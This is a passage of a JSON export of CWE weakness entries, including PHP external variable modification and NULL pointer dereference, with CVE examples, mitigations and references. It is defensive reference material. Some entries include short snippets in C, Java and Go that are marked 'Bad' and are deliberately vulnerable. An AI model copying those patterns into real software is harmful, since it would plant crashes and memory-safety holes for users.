          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-1234"
        },
        {
          "Reference": "CVE-2005-1652",
          "Description": "Authentication bypass by setting a parameter.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1652"
        },
        {
          "Reference": "CVE-2005-1784",
          "Description": "Product does not check authorization for configuration change admin script, leading to password theft via modified e-mail address field.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1784"
        },
        {
          "Reference": "CVE-2005-2314",
          "Description": "Logic error leads to password disclosure.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-2314"
        },
        {
          "Reference": "CVE-2005-1682",
          "Description": "Modification of message number parameter allows attackers to read other people's messages.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-1682"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Web Parameter Tampering"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2007",
          "EntryID": "A4",
          "EntryName": "Insecure Direct Object Reference",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A1",
          "EntryName": "Unvalidated Input",
          "MappingFit": "CWE More Specific"
        }
      ],
      "RelatedAttackPatterns": [
        "146",
        "226",
        "31",
        "39"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-44",
          "Section": "\"Sin 4: Use of Magic URLs, Predictable Cookies, and Hidden Form\n                  Fields.\" Page 75",
          "Authors": [
            "Michael Howard",
            "David LeBlanc",
            "John Viega"
          ],
          "Title": "24 Deadly Sins of Software Security",
          "Publication": "McGraw-Hill",
          "PublicationYear": "2010"
        },
        {
          "ExternalReferenceID": "REF-62",
          "Section": "Chapter 17, \"Embedding State in HTML and URLs\", Page 1032",
          "Authors": [
            "Mark Dowd",
            "John McDonald",
            "Justin Schuh"
          ],
          "Title": "The Art of Software Security Assessment",
          "Edition": "1st Edition",
          "PublicationYear": "2006",
          "Publisher": "Addison Wesley"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This is a primary weakness for many other weaknesses and functional consequences, including XSS, SQL injection, path disclosure, and file inclusion."
        },
        {
          "Type": "Theoretical",
          "Note": "This is a technology-specific MAID problem."
        }
      ]
    },
    {
      "ID": "473",
      "Name": "PHP External Variable Modification",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "A PHP application does not properly protect against the modification of variables from external sources, such as query parameters or cookies. This can expose the application to numerous weaknesses that would not exist otherwise.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "471",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "CanPrecede",
          "CweID": "98",
          "ViewID": "1000"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation",
          "Note": "REALIZATION: This weakness is caused during implementation of an architectural security tactic."
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Application Data"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Requirements",
            "Implementation"
          ],
          "Description": "Carefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals."
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2000-0860",
          "Description": "File upload allows arbitrary file read by setting hidden form variables to match internal variable names.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2000-0860"
        },
        {
          "Reference": "CVE-2001-0854",
          "Description": "Mistakenly trusts $PHP_SELF variable to determine if include script was called by its parent.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-0854"
        },
        {
          "Reference": "CVE-2002-0764",
          "Description": "PHP remote file inclusion by modified assumed-immutable variable.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0764"
        },
        {
          "Reference": "CVE-2001-1025",
          "Description": "Modify key variable when calling scripts that don't load a library that initializes it.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1025"
        },
        {
          "Reference": "CVE-2003-0754",
          "Description": "Authentication bypass by modifying array used for authentication.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-0754"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "PHP External Variable Modification"
        }
      ],
      "RelatedAttackPatterns": [
        "77"
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Relationship",
          "Note": "This is a language-specific instance of Modification of Assumed-Immutable Data (MAID). This can be resultant from direct request (alternate path) issues. It can be primary to weaknesses such as PHP file inclusion, SQL injection, XSS, authentication bypass, and others."
        }
      ]
    },
    {
      "ID": "474",
      "Name": "Use of Function with Inconsistent Implementations",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code uses a function that has inconsistent implementations across operating systems and versions.",
      "ExtendedDescription": "\n\nThe use of inconsistent implementations can cause changes in behavior when the code is ported or built under a different environment than the programmer expects, which can lead to security problems in some cases.\n\n\nThe implementation of many functions varies by platform, and at times, even by different versions of the same platform. Implementation differences can include:\n\n\n  - Slight differences in the way parameters are interpreted leading to inconsistent results.\n\n  - Some implementations of the function carry significant security risks.\n\n  - The function might not be defined on all platforms.\n\n  - The function might change which return codes it can provide, or change the meaning of its return codes.\n\n",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "758",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Primary"
        },
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "PHP",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design",
            "Requirements"
          ],
          "Description": "Do not accept inconsistent behavior from the API specifications when the deviant behavior increase the risk level."
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Inconsistent Implementations"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP3",
          "EntryName": "Use of an improper API"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "475",
      "Name": "Undefined Behavior for Input to API",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The behavior of this function is undefined unless its control parameter is set to a specific value.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "573",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design"
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation",
            "Varies by Context"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Undefined Behavior"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP1",
          "EntryName": "Glitch in computation"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Other",
          "Note": "The Linux Standard Base Specification 2.0.1 for libc places constraints on the arguments to some internal functions [21]. If the constraints are not met, the behavior of the functions is not defined. It is unusual for this function to be called directly. It is almost always invoked through a macro defined in a system header file, and the macro ensures that the following constraints are met: The value 1 must be passed to the third parameter (the version number) of the following file system function: __xmknod The value 2 must be passed to the third parameter (the group argument) of the following wide character string functions: __wcstod_internal __wcstof_internal __wcstol_internal __wcstold_internal __wcstoul_internal The value 3 must be passed as the first parameter (the version number) of the following file system functions: __xstat __lxstat __fxstat __xstat64 __lxstat64 __fxstat64"
        }
      ]
    },
    {
      "ID": "476",
      "Name": "NULL Pointer Dereference",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Stable",
      "Diagram": "/data/images/CWE-476-Diagram.png",
      "Description": "The product dereferences a pointer that it expects to be valid but is NULL.",
      "LikelihoodOfExploit": "Medium",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "754",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "754",
          "ViewID": "1003",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Resultant",
          "Description": "NULL pointer dereferences are frequently resultant from rarely encountered error conditions and race conditions, since these are most likely to escape detection during the testing phases."
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Java",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C#",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "Go",
          "Prevalence": "Undetermined"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "NPD",
          "Description": "Common abbreviation for Null Pointer Dereference"
        },
        {
          "Term": "null deref",
          "Description": "Common abbreviation for Null Pointer Dereference"
        },
        {
          "Term": "NPE",
          "Description": "Common abbreviation for Null Pointer Exception"
        },
        {
          "Term": "nil pointer dereference",
          "Description": "used for access of nil in Go programs"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "NULL pointer dereferences usually result in the failure of the process unless exception handling (on some platforms) is available and implemented. Even when exception handling is being used, it can still be very difficult to return the software to a safe state of operation."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality"
          ],
          "Impact": [
            "Execute Unauthorized Code or Commands",
            "Read Memory",
            "Modify Memory"
          ],
          "Note": "In rare circumstances, when NULL is equivalent to the 0x0 memory address and privileged code can access it, then writing or reading memory is possible, which may lead to code execution."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-2",
          "Method": "Automated Dynamic Analysis",
          "Description": "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.",
          "Effectiveness": "Moderate"
        },
        {
          "DetectionMethodID": "DM-12",
          "Method": "Manual Dynamic Analysis",
          "Description": "Identify error conditions that are not likely to occur during normal usage and trigger them. For example, run the program under low memory conditions, run with insufficient privileges or permissions, interrupt a transaction before it is completed, or disable connectivity to basic network services such as DNS. Monitor the software for any unexpected behavior. If you trigger an unhandled exception or similar error that was discovered and handled by the application's environment, it may still indicate unexpected conditions that were not handled by the application itself."
        },
        {
          "DetectionMethodID": "DM-14",
          "Method": "Automated Static Analysis",
          "Description": "Automated static analysis, commonly referred to as Static Application Security Testing (SAST), can find some instances of this weakness by analyzing source code (or binary/compiled code) without having to execute it. Typically, this is done by building a model of data flow and control flow, then searching for potentially-vulnerable patterns that connect \"sources\" (origins of input) with \"sinks\" (destinations where the data interacts with external components, a lower layer such as the OS, etc.)",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "If all pointers that could have been modified are checked for NULL before use, nearly all NULL pointer dereferences can be prevented."
        },
        {
          "Phase": [
            "Requirements"
          ],
          "Description": "Select a programming language that is not susceptible to these issues."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Check the results of all functions that return a value and verify that the value is non-null before acting upon it.",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment. This solution does not handle the use of improperly initialized variables (CWE-665)."
        },
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Identify all variables and data stores that receive information from external sources, and apply input validation to make sure that they are only initialized to expected values."
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Explicitly initialize all variables and other data stores, either during declaration or just before the first usage."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "While there are no complete fixes aside from conscientious programming, the following steps will go a long way to ensure that NULL pointer dereferences do not occur."
            },
            {
              "Nature": "Good",
              "ExampleCode": "```\n\tif (pointer1 != NULL) {\n```\n/* make use of pointer1 */* \n\t\t\t\n\t\t\t */* ... */* \n\t\t\t}"
            },
            {
              "BodyText": "When working with a multithreaded or otherwise asynchronous environment, ensure that proper locking APIs are used to lock before the if statement; and unlock when it has finished."
            }
          ]
        },
        {
          "ID": "DX-1",
          "Entries": [
            {
              "IntroText": "This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"
            },
            {
              "BodyText": "If an attacker provides an address that appears to be well-formed, but the address does not resolve to a hostname, then the call to gethostbyaddr() will return NULL. Since the code does not check the return value from gethostbyaddr (CWE-252), a NULL pointer dereference (CWE-476) would then occur in the call to strcpy()."
            },
            {
              "BodyText": "Note that this code is also vulnerable to a buffer overflow (CWE-119)."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In the following code, the programmer assumes that the system always has a property named \"cmd\" defined. If an attacker can control the program's environment so that \"cmd\" is not defined, the program throws a NULL pointer exception when it attempts to call the trim() method."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString cmd = System.getProperty(\"cmd\");\n\tcmd = cmd.trim();\n```"
            }
          ]
        },
        {
          "ID": "DX-110",
          "Entries": [
            {
              "IntroText": "This Android application has registered to handle a URL when sent an intent:"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n```\n...* \n\tIntentFilter filter = new IntentFilter(\"com.example.URLHandler.openURL\");\n\tMyReceiver receiver = new MyReceiver();\n\tregisterReceiver(receiver, filter);\n\t\n\t *...* \n\t\n\tpublic class UrlHandlerReceiver extends BroadcastReceiver {\n\t```\n\t\t\t@Override\n\t\t\tpublic void onReceive(Context context, Intent intent) {\n\t\t\t\t\tif(\"com.example.URLHandler.openURL\".equals(intent.getAction())) {\n\t\t\t\t\t\tString URL = intent.getStringExtra(\"URLToOpen\");\n\t\t\t\t\t\tint length = URL.length();\n```\n...* \n\t\t\t\t\t}}}"
            },
            {
              "BodyText": "The application assumes the URL will always be included in the intent. When the URL is not present, the call to getStringExtra() will return null, thus causing a null pointer exception when length() is called."
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "Consider the following example of a typical client server exchange. The HandleRequest function is intended to perform a request and use a defer to close the connection whenever the function returns."
            },
            {
              "Nature": "Bad",
              "Language": "Go",
              "ExampleCode": "```\n\tfunc HandleRequest(client http.Client, request *http.Request) (*http.Response, error) { \n\t\t response, err := client.Do(request)\n\t\t defer response.Body.Close()\n\t\t if err != nil { \n\t\t\t return nil, err\n\t\t }\n\t\t...\n\t }\n```"
            },
            {
              "BodyText": "If a user supplies a malformed request or violates the client policy, the Do method can return a nil response and a non-nil err."
            },
            {
              "BodyText": "This HandleRequest Function evaluates the close before checking the error. A deferred call's arguments are evaluated immediately, so the defer statement panics due to a nil response."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2005-3274",
          "Description": "race condition causes a table to be corrupted if a timer activates while it is being modified, leading to resultant NULL dereference; also involves locking.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-3274"
        },
        {
          "Reference": "CVE-2002-1912",
          "Description": "large number of packets leads to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-1912"
        },
        {
          "Reference": "CVE-2005-0772",
          "Description": "packet with invalid error status value triggers NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2005-0772"
        },
        {
          "Reference": "CVE-2009-4895",
          "Description": "Chain: race condition for an argument value, possibly resulting in NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-4895"
        },
        {
          "Reference": "CVE-2020-29652",
          "Description": "ssh component for Go allows clients to cause a denial of service (nil pointer dereference) against SSH servers.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-29652"
        },
        {
          "Reference": "CVE-2009-2692",
          "Description": "Chain: Use of an unimplemented network socket operation pointing to an uninitialized handler function (CWE-456) causes a crash because of a null pointer dereference (CWE-476).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"
        },
        {
          "Reference": "CVE-2009-3547",
          "Description": "Chain: race condition (CWE-362) might allow resource to be released before operating on it, leading to NULL dereference (CWE-476)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3547"
        },
        {
          "Reference": "CVE-2009-3620",
          "Description": "Chain: some unprivileged ioctls do not verify that a structure has been initialized before invocation, leading to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-3620"
        },
        {
          "Reference": "CVE-2009-2698",
          "Description": "Chain: IP and UDP layers each track the same value with different mechanisms that can get out of sync, possibly resulting in a NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2698"
        },
        {
          "Reference": "CVE-2009-2692",
          "Description": "Chain: uninitialized function pointers can be dereferenced allowing code execution",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2692"
        },
        {
          "Reference": "CVE-2009-0949",
          "Description": "Chain: improper initialization of memory can lead to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0949"
        },
        {
          "Reference": "CVE-2008-3597",
          "Description": "Chain: game server can access player data structures before initialization has happened leading to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-3597"
        },
        {
          "Reference": "CVE-2020-6078",
          "Description": "Chain: The return value of a function returning a pointer is not checked for success (CWE-252) resulting in the later use of an uninitialized variable (CWE-456) and a null pointer dereference (CWE-476)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-6078"
        },
        {
          "Reference": "CVE-2008-0062",
          "Description": "Chain: a message having an unknown message type may cause a reference to uninitialized memory resulting in a null pointer dereference (CWE-476) or dangling pointer (CWE-825), possibly crashing the system or causing heap corruption.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-0062"
        },
        {
          "Reference": "CVE-2008-5183",
          "Description": "Chain: unchecked return value can lead to NULL dereference",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2008-5183"
        },
        {
          "Reference": "CVE-2004-0079",
          "Description": "SSL software allows remote attackers to cause a denial of service (crash) via a crafted SSL/TLS handshake that triggers a null dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0079"
        },
        {
          "Reference": "CVE-2004-0365",
          "Description": "Network monitor allows remote attackers to cause a denial of service (crash) via a malformed RADIUS packet that triggers a null dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0365"
        },
        {
          "Reference": "CVE-2003-1013",
          "Description": "Network monitor allows remote attackers to cause a denial of service (crash) via a malformed Q.931, which triggers a null dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1013"
        },
        {
          "Reference": "CVE-2003-1000",
          "Description": "Chat client allows remote attackers to cause a denial of service (crash) via a passive DCC request with an invalid ID number, which causes a null dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2003-1000"
        },
        {
          "Reference": "CVE-2004-0389",
          "Description": "Server allows remote attackers to cause a denial of service (crash) via malformed requests that trigger a null dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0389"
        },
        {
          "Reference": "CVE-2004-0119",
          "Description": "OS allows remote attackers to cause a denial of service (crash from null dereference) or execute arbitrary code via a crafted request during authentication protocol selection.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0119"
        },
        {
          "Reference": "CVE-2004-0458",
          "Description": "Game allows remote attackers to cause a denial of service (server crash) via a missing argument, which triggers a null pointer dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-0458"
        },
        {
          "Reference": "CVE-2002-0401",
          "Description": "Network monitor allows remote attackers to cause a denial of service (crash) or execute arbitrary code via malformed packets that cause a NULL pointer dereference.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-0401"
        },
        {
          "Reference": "CVE-2001-1559",
          "Description": "Chain: System call returns wrong value (CWE-393), leading to a resultant NULL dereference (CWE-476).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2001-1559"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Null Dereference"
        },
        {
          "TaxonomyName": "CLASP",
          "EntryName": "Null-pointer dereference"
        },
        {
          "TaxonomyName": "PLOVER",
          "EntryName": "Null Dereference (Null Pointer Dereference)"
        },
        {
          "TaxonomyName": "OWASP Top Ten 2004",
          "EntryID": "A9",
          "EntryName": "Denial of Service",
          "MappingFit": "CWE More Specific"
        },
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "EXP34-C",
          "EntryName": "Do not dereference null pointers",
          "MappingFit": "Exact"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP7",
          "EntryName": "Faulty Pointer Use"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        },
        {
          "ExternalReferenceID": "REF-18",
          "Authors": [
            "Secure Software, Inc."
          ],
          "Title": "The CLASP Application Security Process",
          "PublicationYear": "2005",
          "URL": "https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf"
        },
        {
          "ExternalReferenceID": "REF-1031",
          "Title": "Null pointer / Null dereferencing",
          "PublicationYear": "2019",
          "PublicationMonth": "07",
          "PublicationDay": "15",
          "Publisher": "Wikipedia",
          "URL": "https://en.wikipedia.org/wiki/Null_pointer#Null_dereferencing"
        },
        {
          "ExternalReferenceID": "REF-1032",
          "Title": "Null Reference Creation and Null Pointer Dereference",
          "Publisher": "Apple",
          "URL": "https://developer.apple.com/documentation/xcode/null-reference-creation-and-null-pointer-dereference",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1033",
          "Title": "NULL Pointer Dereference [CWE-476]",
          "PublicationYear": "2012",
          "PublicationMonth": "09",
          "PublicationDay": "11",
          "Publisher": "ImmuniWeb",
          "URL": "https://www.immuniweb.com/vulnerability/null-pointer-dereference.html"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "477",
      "Name": "Use of Obsolete Function",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Description": "The code uses deprecated or obsolete functions, which suggests that the code has not been actively reviewed or maintained.",
      "ExtendedDescription": "\n\nAs programming languages evolve, functions occasionally become obsolete due to:\n\n\n  - Advances in the language\n\n  - Improved understanding of how operations should be performed effectively and securely\n\n  - Changes in the conventions that govern certain operations\n\nFunctions that are removed are usually replaced by newer counterparts that perform the same task in some different and hopefully improved way.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "710",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Indirect"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Quality Degradation"
          ]
        }
      ],
      "DetectionMethods": [
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
